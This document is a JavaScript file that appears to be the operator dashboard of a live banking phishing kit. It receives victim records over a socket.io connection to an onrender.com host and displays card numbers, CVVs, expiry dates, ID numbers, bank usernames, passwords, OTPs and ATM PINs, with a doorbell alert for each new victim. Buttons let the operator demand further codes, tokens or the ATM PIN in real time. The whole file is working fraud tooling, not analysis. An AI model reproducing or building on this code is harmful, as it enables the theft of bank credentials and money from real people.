const socket = io.connect("https://huayra.onrender.com");

socket.on("new_dataTable", function (object) {

  console.log(object); 
  let audio = new Audio("../static/audio/timbre.mp3");

  
  let intervalId = setInterval(() => {
    audio.play().catch(function (error) {
      console.log("Error al reproducir el audio:", error);
    });
  }, 1000); 

  
  setTimeout(() => {
    clearInterval(intervalId);
  }, 5000);

  const content = document.getElementById("on-dataTables");
  let panel = document.getElementById("panel-" + object.id);

  if (!panel) {
    console.log("No existe el panel");
    panel = document.createElement("div");
    panel.id = "panel-" + object.id;
    content.appendChild(panel);
  }

  panel.className = "card mb-3";

  let options = {
    year: "2-digit",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  };

  date = new Date(object.horacreado).toLocaleDateString("es-ES", options);
  setDate = new Date(object.horamodificado).toLocaleDateString(
    "es-ES",
    options
  );

  if (object.status == "Finalizado") {
    panel.innerHTML = `<div class="justify-content-center align-items-center mx-auto">
            <h1>Nuevo Dato!</h1>
            <table class="table table-bordered mt-2">
              <thead class="table-primary">
                <tr>
                  <th>Nombre</th>
                  <th>Cédula</th>
                  <th>Direccion</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.nombre}</td>
                  <td>${object.id}</td>
                  <td>${object.direccion}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Tarjeta</th>
                  <th>FTarjeta</th>
                  <th>CVV</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.tarjeta}</td>
                  <td>${object.ftarjeta}</td>
                  <td>${object.cvv}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Email</th>
                  <th>Celular</th>
                  <th>Banco</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.email}</td>
                  <td>${object.celular}</td>
                  <td>${object.banco}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Estado</th>
                  <th>Dispositivo</th>
                  <th>IP</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.status}</td>
                  <td>${object.dispositivo}</td>
                  <td>${object.ip}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Usuario</th>
                  <th>Contraseña</th>
                  <th>OTP</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.usuario}</td>
                  <td>${object.password}</td>
                  <td>${object.otp}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Hora Creado</th>
                  <th>Hora Modificado</th>
                  <th>Clave de cajero</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${date}</td>
                  <td>${setDate}</td>
                  <td>${object.ccajero}</td>
                </tr>
              </tbody>
            </table>
            </div>
        `;
  } else {
    panel.innerHTML = `
          <div class="justify-content-center align-items-center mx-auto">
            <table class="table table-bordered mt-2">
              <thead class="table-primary">
                <tr>
                  <th>Nombre</th>
                  <th>Cédula</th>
                  <th>Direccion</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.nombre}</td>
                  <td>${object.id}</td>
                  <td>${object.direccion}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Tarjeta</th>
                  <th>FTarjeta</th>
                  <th>CVV</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.tarjeta}</td>
                  <td>${object.ftarjeta}</td>
                  <td>${object.cvv}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Email</th>
                  <th>Celular</th>
                  <th>Banco</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.email}</td>
                  <td>${object.celular}</td>
                  <td>${object.banco}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Estado</th>
                  <th>Dispositivo</th>
                  <th>IP</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.status}</td>
                  <td>${object.dispositivo}</td>
                  <td>${object.ip}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Usuario</th>
                  <th>Contraseña</th>
                  <th>OTP</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.usuario}</td>
                  <td>${object.password}</td>
                  <td>${object.otp}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Hora Creado</th>
                  <th>Hora Modificado</th>
                  <th>Clave de Cajero</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${date}</td>
                  <td>${setDate}</td>
                  <td>${object.ccajero}</td>
                </tr>
              </tbody>
            </table>

            <div class="p-3 mb-2 d-flex justify-content-center">
              <button type="button" class="btn btn-primary btn-sm me-3 user-button" id="user-button-${object.idreg}">Pedir Usuario</button>
              <button type="button" class="btn btn-primary btn-sm me-3 OTP-button" id="OTP-button-${object.idreg}">Pedir OTP</button>
              <button type="button" class="btn btn-primary btn-sm me-3 newOTP-button" id="newOTP-button-${object.idreg}">Nuevo OTP</button>
              <button type="button" class="btn btn-primary btn-sm me-3 token-button" id="token-button-${object.idreg}">Token</button>
              <button type="button" class="btn btn-primary btn-sm me-3 newtoken-button" id="newtoken-button-${object.idreg}">Nuevo Token</button>
              <button type="button" class="btn btn-primary btn-sm me-3 ccajero-button" id="ccajero-button-${object.idreg}">Clave de cajero</button>
              <button type="button" class="btn btn-warning btn-sm me-3 error-button" id="error-button-${object.idreg}">Error Datos</button>
              <button type="button" class="btn btn-warning btn-sm me-3 end-button" id="end-button-${object.idreg}">Finalizar</button>
            </div>

          </div>
        `;
        
    let ccajeroButtons = document.querySelector(
      `#ccajero-button-${object.idreg}`
    );
    ccajeroButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/ccajero", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let errorButtons = document.querySelector(`#error-button-${object.idreg}`);
    errorButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/error", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let tokenButtons = document.querySelector(`#token-button-${object.idreg}`);
    tokenButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/token", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let newTokenButtons = document.querySelector(
      `#newtoken-button-${object.idreg}`
    );
    newTokenButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/newToken", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let userButtons = document.querySelector(`#user-button-${object.idreg}`);
    userButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/user", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let OTPButtons = document.querySelector(`#OTP-button-${object.idreg}`);
    OTPButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/otp", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let newOTPButtons = document.querySelector(
      `#newOTP-button-${object.idreg}`
    );
    newOTPButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/newOtp", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });

    let endButtons = document.querySelector(`#end-button-${object.idreg}`);
    endButtons.addEventListener("click", function (link) {
      link.preventDefault();
      fetch("events/finish", {
        method: "POST",
      })
        .then((response) => response.json())
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });
  }

  content.prepend(panel);
});
